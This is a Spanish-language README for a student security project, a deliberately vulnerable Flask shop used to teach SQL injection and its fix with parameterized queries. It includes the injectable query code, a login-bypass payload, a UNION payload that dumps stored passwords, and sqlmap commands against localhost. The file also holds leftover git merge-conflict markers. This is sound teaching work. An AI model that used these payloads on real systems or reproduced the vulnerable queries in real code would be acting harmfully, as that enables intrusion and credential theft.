<<<<<<< HEAD
# AfinAR — Plataforma Web de Instrumentos Musicales
### Trabajo Práctico Integrador (TPI) — Seguridad en el Desarrollo de Software (UTN FRC - 2026)

---

## 📌 Descripción del Proyecto

**AfinAR** es una aplicación web de comercio electrónico desarrollada con **Python, Flask y SQLite** que simula un catálogo exclusivo de instrumentos musicales originales de fábrica y accesorios. 

El objetivo de este proyecto es demostrar de forma práctica y didáctica el impacto de las vulnerabilidades de **Inyección SQL (SQLi)**, cómo pueden ser detectadas y explotadas mediante herramientas de auditoría (**SQLMap**), y cuál es la solución definitiva implementando **consultas preparadas / parametrizadas**.

---

## 👥 Integrantes del Grupo

- **Giorgi, Lorenzo**
- **Franco, Martina**
- **Rojo, Roberto**
- **Gorosito, Tamara**
- **Crespin, Sasha**

---

## 🌿 Estructura de Ramas en el Repositorio

Para facilitar la evaluación y la exposición oral, el repositorio está dividido en dos ramas:

| Rama | Estado | Descripción |
|---|---|---|
| `main` | ⚠️ **Vulnerable** | Contiene el código con inyecciones SQL directas por concatenación de parámetros. |
| `secure` | ✅ **Corregido** | Versión remediada utilizando **consultas parametrizadas (Prepared Statements)** y validación de tipos. |

### ¿Cómo cambiar entre versiones?

```bash
# Para probar la versión vulnerable:
git checkout main

# Para probar la versión segura (remediada):
git checkout secure
```

---

## 🚀 Requisitos e Instalación

### 1. Clonar el repositorio
```bash
git clone <URL_DE_TU_REPOSITORIO>
cd TP-2026
```

### 2. Instalar dependencias
Se recomienda utilizar un entorno virtual con Python 3.10+:
```bash
python -m pip install -r requirements.txt
```

### 3. Inicializar la base de datos
La base de datos SQLite contiene 5 usuarios ficticios y 25 productos precargados con fotos locales:
```bash
python database.py
```

### 4. Ejecutar la aplicación
```bash
python app.py
```
La aplicación quedará disponible en: **http://127.0.0.1:5000**

---

## ⚠️ Puntos Vulnerables en esta rama (`main`)

### 1. Autenticación (`POST /login`)
- **Vulnerabilidad:** Concatenación directa de las credenciales en la consulta SQL.
- **Código vulnerable:**
  ```python
  query = f"SELECT * FROM usuarios WHERE username='{username}' AND password='{password}'"
  ```
- **Prueba manual (Bypass de autenticación):**
  - **Usuario:** `giorgi_l' --`
  - **Contraseña:** (cualquier texto)
  - **Resultado:** Inicio de sesión exitoso como administrador sin conocer la contraseña.

### 2. Buscador (`GET /buscar?q=`)
- **Vulnerabilidad:** Cláusula `LIKE` construida mediante interpolación de cadenas.
- **Código vulnerable:**
  ```python
  query = f"SELECT * FROM productos WHERE nombre LIKE '%{q}%' OR descripcion LIKE '%{q}%' OR categoria LIKE '%{q}%'"
  ```
- **Prueba manual (Extracción mediante UNION):**
  - **Búsqueda:** `%' UNION SELECT id, username, password, email, rol, 0, '' FROM usuarios --`
  - **Resultado:** Se vuelcan los usuarios y contraseñas de la base de datos dentro de los resultados del catálogo.

### 3. Detalle de Producto (`GET /producto/<id>`)
- **Vulnerabilidad:** Parámetro numérico no validado ni casteado a entero.
- **Código vulnerable:**
  ```python
  query = f"SELECT * FROM productos WHERE id={id}"
  ```

---

## 🛠️ Auditoría y Explotación con SQLMap

### Ataque 1: Inyección en el buscador (`/buscar`)
Para detectar la inyección y extraer las tablas de la base de datos:
```bash
sqlmap -u "http://127.0.0.1:5000/buscar?q=guitarra" --batch
```

Para dumpear la tabla de usuarios:
```bash
sqlmap -u "http://127.0.0.1:5000/buscar?q=guitarra" --dump -T usuarios --batch
```

### Ataque 2: Inyección en el Login (`/login`)
```bash
sqlmap -u "http://127.0.0.1:5000/login" --data="username=test&password=test" --method=POST --batch
```

### Ataque 3: Inyección en el parámetro ID (`/producto/<id>`)
```bash
sqlmap -u "http://127.0.0.1:5000/producto/1" --batch
```

---

## 🔒 Solución y Verificación

Para ver el código corregido y comprobar con **SQLMap** que las inyecciones ya no son explotables:
```bash
git checkout secure
```
En la rama `secure` se explica en detalle el diff de remediación y la verificación técnica.
=======
# TP-Seguridad-2026
>>>>>>> 53ba43bef297a0ff211bcae28de8957edcceb8d4
